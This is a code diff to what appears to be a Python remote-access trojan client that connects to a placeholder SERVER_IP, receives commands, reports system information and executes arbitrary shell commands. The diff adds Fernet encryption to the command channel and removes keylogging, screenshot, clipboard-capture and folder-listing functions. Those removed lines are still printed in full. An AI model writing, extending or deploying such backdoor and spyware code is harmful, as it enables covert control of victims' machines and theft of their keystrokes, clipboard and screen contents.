@@ -3,19 +3,22 @@ import subprocess
 import os
 import platform
 import time
-import pyautogui
-import clipboard
-import keyboard
+from cryptography.fernet import Fernet
 
 # Replace these placeholders with actual values during activation
 UID = '<UID>'
 SERVER_IP = '<SERVER_IP>'
+ENCRYPTION_KEY = b'<ENCRYPTION_KEY>'
 
 def encrypt_message(message):
-    return message.encode()
+    cipher = Fernet(ENCRYPTION_KEY)
+    encrypted_message = cipher.encrypt(message.encode())
+    return encrypted_message
 
 def decrypt_message(encrypted_message):
-    return encrypted_message.decode()
+    cipher = Fernet(ENCRYPTION_KEY)
+    decrypted_message = cipher.decrypt(encrypted_message).decode()
+    return decrypted_message
 
 def send_data(data):
     try:
@@ -53,31 +56,6 @@ def get_system_info():
     system_info += f"Processor: {platform.processor()}\n"
     return system_info
 
-def list_folders(directory='.'):
-    folders = []
-    for folder in os.listdir(directory):
-        if os.path.isdir(os.path.join(directory, folder)):
-            folders.append(os.path.join(directory, folder))
-    return folders
-
-def take_screenshot():
-    screenshot_path = f'screenshot_{int(time.time())}.png'
-    pyautogui.screenshot(screenshot_path)
-    return screenshot_path
-
-def save_clipboard_data():
-    clipboard_data = clipboard.paste()
-    with open('clipboard_data.txt', 'a') as clipboard_file:
-        clipboard_file.write(f"{clipboard_data}\n")
-
-def log_key_strokes():
-    def on_key_event(e):
-        if e.event_type == keyboard.KEY_DOWN:
-            with open('key_log.txt', 'a') as key_log_file:
-                key_log_file.write(f"{e.name}\n")
-
-    keyboard.hook(on_key_event)
-
 def main():
     while True:
         command = receive_data()
@@ -90,18 +68,6 @@ def main():
             elif command.startswith("get_sys_info"):
                 system_info = get_system_info()
                 send_data(system_info)
-            elif command.startswith("list_folders"):
-                folders_info = list_folders()
-                send_data(f"List of folders:\n{', '.join(folders_info)}")
-            elif command.startswith("take_screenshot"):
-                screenshot_path = take_screenshot()
-                send_data(f"Screenshot saved at: {screenshot_path}")
-            elif command.startswith("save_clipboard_data"):
-                save_clipboard_data()
-                send_data("Clipboard data saved.")
-            elif command.startswith("log_key_strokes"):
-                log_key_strokes()
-                send_data("Key strokes logging started.")
             else:
                 result = execute_command(command)
                 send_data(result)
